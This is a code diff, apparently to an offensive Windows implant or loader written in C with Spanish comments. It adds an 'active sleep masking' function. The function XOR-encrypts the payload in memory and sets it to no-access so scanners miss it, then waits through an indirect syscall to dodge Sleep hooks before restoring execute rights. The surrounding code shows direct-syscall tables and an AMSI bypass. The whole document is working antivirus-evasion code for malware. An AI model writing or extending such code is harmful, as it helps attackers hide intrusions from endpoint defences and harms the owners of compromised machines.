@@ -28,6 +28,7 @@ typedef struct _API_TABLE {
     SYSCALL_ENTRY NtQueueApcThread;
     SYSCALL_ENTRY NtGetContextThread;
     SYSCALL_ENTRY NtSetContextThread;
+    SYSCALL_ENTRY NtWaitForSingleObject;
     ULONG_PTR CreateWaitableTimerW;
     ULONG_PTR SetWaitableTimer;
 } API_TABLE;
@@ -137,6 +138,45 @@ static BOOL BypassAMSI_DataOnlyRobust() {
         return TRUE;
     }
     return FALSE;
+}
+
+// =============================================================================
+// ACTIVE SLEEP MASKING (SLEEP OBFUSCATION)
+// =============================================================================
+
+static void ActiveSleepMask(DWORD dwMs, PVOID pAddress, SIZE_T sSize) {
+    HANDLE hTimer = NULL;
+    LARGE_INTEGER li;
+    li.QuadPart = -(int64_t)dwMs * 10000; // MS a unidades de 100ns
+
+    typedef HANDLE (WINAPI *CreateWaitableTimerW_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
+    typedef BOOL (WINAPI *SetWaitableTimer_t)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
+
+    CreateWaitableTimerW_t pCreateWaitableTimerW = (CreateWaitableTimerW_t)g_ApiTable.CreateWaitableTimerW;
+    SetWaitableTimer_t pSetWaitableTimer = (SetWaitableTimer_t)g_ApiTable.SetWaitableTimer;
+
+    hTimer = pCreateWaitableTimerW(NULL, TRUE, NULL);
+    if (hTimer) {
+        if (pSetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE)) {
+            ULONG old;
+            
+            // 1. Cifrar la sección de memoria del payload
+            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
+            for (SIZE_T i = 0; i < sSize; i++) ((PBYTE)pAddress)[i] ^= 0x69;
+            
+            // 2. Cambiar permisos a NOACCESS para que los escáneres no lo vean
+            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_NOACCESS, &old);
+
+            // 3. Esperar al temporizador (evade ganchos de Sleep)
+            InvokeSyscall(g_ApiTable.NtWaitForSingleObject.ssn, g_SyscallGadget, hTimer, FALSE, NULL);
+
+            // 4. Restaurar y descifrar
+            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &old);
+            for (SIZE_T i = 0; i < sSize; i++) ((PBYTE)pAddress)[i] ^= 0x69;
+            InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddress, &sSize, PAGE_EXECUTE_READ, &old);
+        }
+        CloseHandle(hTimer);
+    }
 }
 
 #endif
